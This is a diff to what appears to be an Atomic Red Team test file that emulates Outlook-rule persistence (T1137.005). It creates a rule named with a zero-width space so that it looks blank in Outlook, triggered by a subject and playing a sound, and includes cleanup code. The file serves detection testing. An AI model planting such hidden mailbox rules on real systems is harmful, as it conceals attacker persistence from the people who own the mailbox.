@@ -377,73 +377,54 @@ atomic_tests:
           Write-Host "    Outlook COM fails with 0x80080005 when run as Administrator."
           exit 1
       }
-
-      # Write the script body to a temp file to prevent ART executor quoting
-      # from mangling the zero-width space byte sequence at parse time.
       $tmpScript = "$env:TEMP\T1137005_hidden_rule_create.ps1"
-
-      $scriptContent = @'
-      $hiddenName = [System.Text.Encoding]::Unicode.GetString([byte[]](0x0B, 0x20))
-
-      $outlook   = New-Object -ComObject Outlook.Application
-      $namespace = $outlook.GetNamespace("MAPI")
-      $rules     = $namespace.DefaultStore.GetRules()
-      $rule      = $rules.Create($hiddenName, 0)
-
-      $cond = $rule.Conditions.Subject
-      $cond.Enabled = $true
-      $cond.Text    = @("TRIGGER_SUBJECT_PLACEHOLDER")
-
-      $action          = $rule.Actions.PlaySound
-      $action.Enabled  = $true
-      $action.FilePath = "SOUND_FILE_PLACEHOLDER"
-
-      $rule.Enabled = $true
-      $rules.Save()
-
-      Write-Host "[+] Hidden rule created with zero-width space name."
-      Write-Host "[*] Open Outlook via File -> Manage Rules and Alerts - rule name will appear blank."
-      Write-Host "[*] Verify rule exists via PowerShell COM enumeration (Test 4) or Get-InboxRule in Exchange."
-      '@
-
-            # Substitute input arguments at runtime (avoids YAML quoting issues with special chars)
-            $scriptContent = $scriptContent -replace 'TRIGGER_SUBJECT_PLACEHOLDER', '#{trigger_subject}'
-            $scriptContent = $scriptContent -replace 'SOUND_FILE_PLACEHOLDER', '#{sound_file_path}'
-
-            $scriptContent | Set-Content -Path $tmpScript -Encoding UTF8
-            powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmpScript
-            Remove-Item $tmpScript -ErrorAction SilentlyContinue
+      $lines = @(
+          '$hiddenName = [System.Text.Encoding]::Unicode.GetString([byte[]](0x0B, 0x20))',
+          '$outlook   = New-Object -ComObject Outlook.Application',
+          '$namespace = $outlook.GetNamespace("MAPI")',
+          '$rules     = $namespace.DefaultStore.GetRules()',
+          '$rule      = $rules.Create($hiddenName, 0)',
+          '$cond = $rule.Conditions.Subject',
+          '$cond.Enabled = $true',
+          '$cond.Text    = @("#{trigger_subject}")',
+          '$action          = $rule.Actions.PlaySound',
+          '$action.Enabled  = $true',
+          '$action.FilePath = "#{sound_file_path}"',
+          '$rule.Enabled = $true',
+          '$rules.Save()',
+          'Write-Host "[+] Hidden rule created with zero-width space name."',
+          'Write-Host "[*] Open Outlook via File -> Manage Rules and Alerts - rule name will appear blank."',
+          'Write-Host "[*] Verify rule exists via PowerShell COM enumeration (Test 4) or Get-InboxRule in Exchange."'
+      )
+      $lines -join "`n" | Set-Content -Path $tmpScript -Encoding UTF8
+      powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmpScript
+      Remove-Item $tmpScript -ErrorAction SilentlyContinue
   cleanup_command: |
     $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
     if ($isAdmin) {
         Write-Host "[-] Cleanup must be run from a non-elevated PowerShell session. Skipping."
         exit 1
     }
-
     $tmpScript = "$env:TEMP\T1137005_hidden_rule_cleanup.ps1"
-
-    $scriptContent = @'
-    $hiddenName = [System.Text.Encoding]::Unicode.GetString([byte[]](0x0B, 0x20))
-    $outlook    = New-Object -ComObject Outlook.Application
-    $namespace  = $outlook.GetNamespace("MAPI")
-    $rules      = $namespace.DefaultStore.GetRules()
-    $removed    = $false
-
-    for ($i = $rules.Count; $i -ge 1; $i--) {
-        if ($rules.Item($i).Name -eq $hiddenName) {
-            $rules.Remove($rules.Item($i).Name)
-            $removed = $true
-        }
-    }
-
-    if ($removed) {
-        $rules.Save()
-        Write-Host "[+] Hidden rule(s) removed."
-    } else {
-        Write-Host "[-] Hidden rule not found - may have already been removed."
-    }
-    '@
-
-        $scriptContent | Set-Content -Path $tmpScript -Encoding UTF8
-        powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmpScript
-        Remove-Item $tmpScript -ErrorAction SilentlyContinue
+    $lines = @(
+        '$hiddenName = [System.Text.Encoding]::Unicode.GetString([byte[]](0x0B, 0x20))',
+        '$outlook    = New-Object -ComObject Outlook.Application',
+        '$namespace  = $outlook.GetNamespace("MAPI")',
+        '$rules      = $namespace.DefaultStore.GetRules()',
+        '$removed    = $false',
+        'for ($i = $rules.Count; $i -ge 1; $i--) {',
+        '    if ($rules.Item($i).Name -eq $hiddenName) {',
+        '        $rules.Remove($rules.Item($i).Name)',
+        '        $removed = $true',
+        '    }',
+        '}',
+        'if ($removed) {',
+        '    $rules.Save()',
+        '    Write-Host "[+] Hidden rule(s) removed."',
+        '} else {',
+        '    Write-Host "[-] Hidden rule not found - may have already been removed."',
+        '}'
+    )
+    $lines -join "`n" | Set-Content -Path $tmpScript -Encoding UTF8
+    powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmpScript
+    Remove-Item $tmpScript -ErrorAction SilentlyContinue
